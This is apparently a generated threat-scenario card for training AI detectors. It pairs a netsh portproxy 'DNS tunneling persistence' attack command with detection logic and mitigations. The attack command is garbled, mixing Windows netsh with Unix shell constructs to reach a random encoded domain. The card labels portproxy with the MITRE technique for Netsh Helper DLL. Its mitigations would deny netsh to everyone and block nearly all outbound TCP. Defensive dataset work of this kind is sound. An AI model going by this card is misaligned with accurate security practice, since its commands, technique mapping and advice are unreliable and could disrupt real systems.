---
type: campaign
scenario_id: 458
tactic: Persistence
technique: "T1546.007: Netsh Portproxy"
technique_id: T1546.007
tags: [campaign, lotl, persistence]
---

# Using netsh portproxy for DNS tunneling persistence.

## Threat Description
Using netsh portproxy for DNS tunneling persistence.

## Attack Command
```
netsh interface portproxy add v4tov4 listenport=$(shuf -i 1024-65535 -n 1) listenaddress=0.0.0.0 connectport=53 connectaddress=$(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)
```

## Detection Logic
Monitor netsh portproxy: `netsh interface portproxy show all | findstr 53`; Event ID 4688.

## Mitigation
Restrict netsh: `icacls %windir%\System32\netsh.exe /deny Everyone:RX`; Block portproxy: `netsh advfirewall firewall add rule name='Block Portproxy' dir=out action=block protocol=TCP localport=1024-65535`.

## AI Training Prompt
Train AI to detect netsh portproxy-based DNS tunneling persistence by analyzing portproxy configurations, DNS query patterns, and netsh command-line arguments; suggest portproxy restrictions.

## References
- MITRE ATT&CK T1546.007: https://attack.mitre.org/techniques/T1546/007/
- CWE-732: https://cwe.mitre.org/data/definitions/732.html
